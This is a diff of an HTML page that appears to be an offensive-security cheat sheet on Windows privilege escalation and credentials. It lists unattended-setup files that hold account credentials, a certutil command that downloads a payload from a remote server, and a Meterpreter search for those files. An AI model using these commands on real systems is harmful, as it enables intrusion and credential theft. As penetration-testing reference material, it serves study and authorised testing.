@@ -818,11 +818,12 @@ administrative/elevated privileges by abusing the inbuilt Windows AutoElevate to
 </code></pre></div>
 <h1 id="windows-credential_2">Windows Credential</h1>
 <p>The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:</p>
-<div class="highlight"><pre><span></span><code><span class="n">- C:\\Windows\Panther\Unattend.xml</span>
-<span class="n">- C:\\Windows\Panther\Autounattend.xml</span>
-</code></pre></div>
+<ul>
+<li><code>C:\Windows\Panther\Unattend.xml</code></li>
+<li><code>C:\Windows\Panther\Autounattend.xml</code></li>
+</ul>
 <p>CMD Download files from remote server:</p>
-<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">certutil</span><span class="w"> </span><span class="o">-</span><span class="n">urlcache</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//&lt;</span><span class="k">remote</span><span class="w"> </span><span class="n">server</span>\<span class="o">&gt;/</span><span class="n">payload</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">payload</span><span class="o">.</span><span class="n">exe</span>
+<div class="highlight"><pre><span></span><code><span class="n">certutil</span><span class="w"> </span><span class="o">-</span><span class="n">urlcache</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//&lt;</span><span class="k">remote</span><span class="w"> </span><span class="n">server</span>\<span class="o">&gt;/</span><span class="n">payload</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">payload</span><span class="o">.</span><span class="n">exe</span>
 </code></pre></div>
 <p>In a Meterpreter session, search for a file matching the specified name:</p>
 <div class="highlight"><pre><span></span><code><span class="n">- search -f &lt;name&gt; -&gt; ex: search -f Unattend.xml</span>
